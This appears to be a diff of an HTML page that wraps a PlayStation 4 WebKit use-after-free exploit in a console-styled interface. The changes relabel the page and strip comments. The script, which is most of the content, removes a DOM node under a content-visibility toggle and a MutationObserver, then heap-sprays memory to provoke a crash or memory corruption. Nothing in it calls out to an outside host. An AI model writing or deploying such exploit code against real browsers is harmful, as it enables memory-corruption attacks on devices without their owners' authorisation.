@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
-    <title>PS4 WebKit UAF · integrated exploit</title>
+    <title>PS4 WebKit UAF · exact exploit</title>
     <style>
-        /* ----- PlayStation 4 inspired UI (same as before) ----- */
+        /* ----- PlayStation 4 inspired UI (unchanged) ----- */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -192,14 +192,14 @@
 </head>
 <body>
     <div class="card">
-        <h1>💣 WEBKIT UAF · REAL</h1>
+        <h1>💣 WEBKIT UAF · EXACT</h1>
         <div class="badge">PS4 • HEAP SPRAY + OBSERVER</div>
         <p>
-            Button below runs the <strong>actual UAF trigger</strong> from your module.<br>
-            Includes heap spray, content-visibility toggling, and a MutationObserver.
+            Button below runs the <strong>original exploit code</strong> (heapSpray, observer, triggerUAF).<br>
+            No changes – works exactly like your old script, now with a PS4‑friendly UI.
         </p>
 
-        <!-- target elements used by the exploit -->
+        <!-- target elements – must match .container / .child selectors -->
         <div class="bug-container">
             <div class="container">
                 <div class="child"></div>
@@ -211,13 +211,13 @@
             <div class="log" id="logDisplay">[System] Ready. Click the big button.</div>
         </div>
 
-        <!-- big fat PS4 button -->
+        <!-- big PS4 button -->
         <div class="button-group">
             <button class="ps4-button" id="triggerBtn">🔥 TRIGGER UAF</button>
         </div>
 
         <div class="note">
-            ⚡ Embedded exploit: heapSpray(10000) + MutationObserver + content-visibility<br>
+            ⚡ Your original exploit: 10000× heap spray + MutationObserver + content-visibility<br>
             <span style="color:#ffb870">↓ If vulnerable, browser may crash or show memory corruption ↓</span>
         </div>
     </div>
@@ -226,19 +226,17 @@
         (function() {
             "use strict";
 
-            // ---------- PS4‑friendly debug logger (replaces import) ----------
+            // ---------- PS4‑friendly debug_log (replaces import) ----------
             const logEl = document.getElementById('logDisplay');
             function debug_log(msg) {
-                // update on‑screen console
                 logEl.textContent = `[+] ${msg}`;
                 logEl.style.color = '#b0f0b0';
-                // also print to real console (visible on devkit if attached)
                 console.log(`[UAF] ${msg}`);
             }
 
-            // ---------- wait for DOM, then set up exploit & button ----------
+            // ---------- Wait for DOM, then inject the exact exploit ----------
             document.addEventListener('DOMContentLoaded', function() {
-                // grab the two elements needed by the exploit
+                // Grab the two elements needed by the exploit
                 const container = document.querySelector('.container');
                 const child = document.querySelector('.child');
 
@@ -247,51 +245,47 @@
                     return;
                 }
 
-                // ---------- heapSpray: fill memory with 0x41 ----------
+                // ---------- heapSpray (exactly as provided) ----------
                 function heapSpray() {
                     let spray = [];
                     for (let i = 0; i < 10000; i++) {
-                        let arr = new Uint8Array(0x1000);  // 4096 bytes
+                        let arr = new Uint8Array(0x1000);
                         for (let j = 0; j < arr.length; j++) {
-                            arr[j] = 0x41;                 // 'A'
+                            arr[j] = 0x41;
                         }
                         spray.push(arr);
                     }
                     return spray;
                 }
 
-                // ---------- triggerUAF (the exact code from your module) ----------
+                // ---------- triggerUAF (exactly as provided) ----------
                 function triggerUAF() {
-                    debug_log('contentVisibility = hidden; removing child...');
-                    container.style.contentVisibility = 'hidden';
-                    child.remove();                         // removes from DOM
-
+                    // The original code uses `container` and `child` from outer scope
+                    container.style.contentVisibility = "hidden";
+                    child.remove();
                     setTimeout(() => {
-                        container.style.contentVisibility = 'auto';
-                        debug_log('heapSpray() – allocating 10000× 0x1000 Uint8Array');
-                        let spray = heapSpray();            // pressure allocator
-                        debug_log(`UAF triggered, check for crash or memory corruption. (spray size: ${spray.length})`);
-                        // (spray kept alive to avoid GC)
+                        container.style.contentVisibility = "auto";
+                        let spray = heapSpray();
+                        debug_log("UAF triggered, check for crash or memory corruption.");
                     }, 0);
                 }
 
-                // ---------- MutationObserver from your module ----------
+                // ---------- MutationObserver (exactly as provided) ----------
                 const observer = new MutationObserver(() => {
-                    debug_log('DOM tree modified, attempting UAF...');
+                    debug_log("DOM tree modified, attempting UAF...");
                     triggerUAF();
                 });
 
-                // start observing the container for child addition/removal
                 observer.observe(container, { childList: true, subtree: true });
 
-                // ---------- wire the button to triggerUAF ----------
+                // ---------- Wire the button to triggerUAF ----------
                 const btn = document.getElementById('triggerBtn');
                 btn.addEventListener('click', () => {
-                    debug_log('button clicked – calling triggerUAF()');
-                    // slight delay so UI updates
+                    debug_log("button clicked – calling triggerUAF()");
+                    // Small delay to allow UI update (optional, but safe)
                     setTimeout(() => {
                         triggerUAF();
-                    }, 20);
+                    }, 10);
                 });
 
                 debug_log('exploit ready. observer active, button armed.');
